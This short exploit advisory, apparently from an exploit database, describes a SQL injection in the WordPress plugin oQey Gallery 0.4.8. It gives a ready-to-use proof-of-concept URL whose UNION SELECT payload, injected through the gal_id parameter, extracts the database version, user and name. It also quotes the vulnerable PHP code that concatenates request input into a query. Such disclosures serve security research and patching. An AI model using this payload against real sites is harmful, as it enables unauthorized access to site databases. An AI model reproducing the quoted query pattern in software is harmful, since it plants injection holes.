# Date: 2011-09-05
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 0.4.8 (tested)
# Note: magic_quotes has to be turned off
 
---
PoC
---
http://www.site.com/wp-content/plugins/oqey-gallery/getimages.php?gal_id=0&#039; UNION ALL SELECT 1,2,3,4,5,6,7,CONCAT_WS(CHAR(95),version(),current_user(),database()),9,10%23
 
---------------
Vulnerable code
---------------
if(isset($_REQUEST[&#039;gal_id&#039;])){
    ...
    $data = explode("-", $_REQUEST[&#039;gal_id&#039;]);
    $id = $data[0];
    ...
    $s = $wpdb->get_row("SELECT * FROM $oqey_galls WHERE id =&#039;".$id."&#039; ");



